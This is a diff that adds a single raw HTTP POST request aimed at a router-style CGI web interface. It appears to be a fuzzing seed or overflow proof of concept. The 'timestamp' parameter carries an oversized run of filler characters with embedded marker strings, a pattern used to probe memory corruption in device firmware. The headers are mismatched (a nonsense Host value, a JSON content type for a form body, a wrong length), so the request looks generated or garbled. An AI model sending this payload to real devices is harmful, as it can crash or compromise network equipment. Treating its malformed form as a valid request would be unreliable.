@@ -1,0 +1,6 @@
+POST /apply.cgi?/USB_browse.htm?openfile=USB_Folder_edit.htm?editFolderID= HTTP/1.1
+Host: change_language
+Content-Type: application/json
+Content-Length: 318
+
+hidden_pppoe2_policy=wzqwzqwzq&submit_flag=ether&%20timestamp=aaaaaaaaaaaaaaaaaaaWZQwaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaWZQwzaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
